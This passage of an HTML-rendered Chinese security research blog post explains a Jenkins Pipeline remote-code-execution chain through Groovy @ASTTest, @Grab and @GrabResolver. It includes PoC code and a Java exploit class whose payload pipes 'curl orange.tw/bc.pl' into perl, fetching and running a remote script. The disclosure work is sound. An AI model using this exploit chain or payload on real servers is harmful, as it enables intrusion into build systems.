    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;從組合語言的結果可以看出這些值在編譯期間就被計算好填充進去，而不是執行期間!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;更多的例子你可以參考 StackOverflow 上的 &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; 這篇文章!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;首次嘗試&quot;&gt;首次嘗試&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;回到我們的漏洞利用上，Pipeline 是基於 Groovy 上的一個 DSL 實作，而 Groovy 剛好就是一門對於 Meta-Programming 非常友善的語言! 翻閱著 Grovvy 官方的 &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming 手冊&lt;/a&gt; 開始尋找各種可以利用的方法! 在 2.1.9 章「測試協助」這個段落發現了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; 這個註解，仔細觀察它的敘述:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the bytecode is produced. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;什麼! 可以在 AST 上執行一個 assertion? 這不就是我們要的嗎? 趕緊先在本地寫個 Proof-of-Concept 嘗試是否可行:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;幹，可以欸! 但代誌並不是憨人想的那麼簡單! 嘗試在遠端 Jenkins 重現時，出現了:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;真是黑人問號，森77，這到底是三小啦!!!&lt;/p&gt;

&lt;p&gt;認真追了一下 root cause 才發現是 &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; 這個插件在作怪! 為了方便使用者可重複使用在編寫 Pipeline 常用到的功能，Jenkins 提供了這個插件可在 Pipeline 中引入自定義的函式庫! Jenkins 會在所有 Pipeline 執行前引入這個函式庫，而在編譯時期的 classPath 中並沒有相對應的函式庫因而導致了這個錯誤!&lt;/p&gt;

&lt;p&gt;想解決這個問題很簡單，到 &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; 中將 &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; 移除即可解決這個問題並執行任意代碼!&lt;/p&gt;

&lt;p&gt;不過這絕對不是最佳解! 這個插件會隨著 Pipeline 被自動安裝，為了要成功利用這個漏洞還得先要求管理員把它移除實在太蠢了! 因此這條路只能先打住，繼續尋找下一個方法!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;再次嘗試&quot;&gt;再次嘗試&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;繼續閱讀 &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming 手冊&lt;/a&gt;，我們發現了另一個有趣的註解 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;，關於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; 手冊中並沒有詳細的描述，但使用 Google 我們發現了另一篇文章 - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;原來 Grape(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;) 是一個 Groovy 內建的動態 JAR 相依性管理程式! 可讓開發者動態的引入不在 classPath 上的函式庫! Grape 的語法如下:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.springframework&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;spring-orm&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;3.2.5.RELEASE&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;配合 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@grab&lt;/code&gt; 的註解，可讓 Groovy 在編譯時期自動引入不存在於 classPath 中的 JAR 檔! 但如果你的目的只是要在一個有執行 Pipeline 權限的帳號上繞過原有 Pipeline 的 Sandbox 的話，這其實就足夠了! 例如你可以參考 &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; 所提供的 &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt;，在已知使用者帳號與密碼及權限足夠的情況下，達到遠端代碼執行的效果!&lt;/p&gt;

&lt;p&gt;但在沒有帳號密碼及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 的方法下，這只是一個簡單的語法樹解析器，你甚至無法控制遠端伺服器上的檔案，所以該怎麼辦呢? 我們繼續研究下去，並發現了一個很有趣的註解叫做 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;，用法如下:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://maven.restlet.org/&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1.1.6&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看到這個，聰明的你應該會很想把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; 改成惡意網址對吧! 我們來試試會怎麼樣吧!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@GrabResolver(name=&apos;restlet&apos;, root=&apos;http://orange.tw/&apos;)
@Grab(group=&apos;org.restlet&apos;, module=&apos;org.restlet&apos;, version=&apos;1.1.6&apos;)
import org.restlet
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;喔幹，真的會來存取欸! 到這裡我們已經確信了透過 Grape 可以讓 Jenkins 引入惡意的函式庫! 但下一個問題是，要如何執行代碼呢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何執行任意代碼&quot;&gt;如何執行任意代碼?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;在漏洞的利用中總是在研究如何從簡單的任意讀、任意寫到取得系統執行的權限! 從前面的例子中，我們已經可以透過 Grape 去寫入惡意的 JAR 檔到遠端伺服器，但要怎麼執行這個 JAR 檔呢? 這又是另一個問題!&lt;/p&gt;

&lt;p&gt;跟進 Groovy 語言核心查看對於 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape 的實作&lt;/a&gt;，我們知道網路層的抓取是透過 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt; 這個類別來完成! 所以開始尋找實作中是否有任何可以執行代碼的機會! 其中，我們看到了一個有趣的方法 - &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&apos;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由於 JAR 檔案其實就是一個 ZIP 壓縮格式的子集，Grape 會檢查檔案中是否存在一些指定的入口點，其中一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runner&lt;/code&gt; 的入口點檢查引起了我們的興趣，持續跟進 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(…)&lt;/a&gt; 的實作我們發現:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這裡的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt; 不就代表著可以呼叫到任意類別的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; 嗎? 沒錯! 所以只需產生一個惡意的 JAR 檔，把要執行的類別全名放至 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; 中即可呼叫指定類別的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; 去執行任意代碼! 完整的漏洞利用過程如下:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
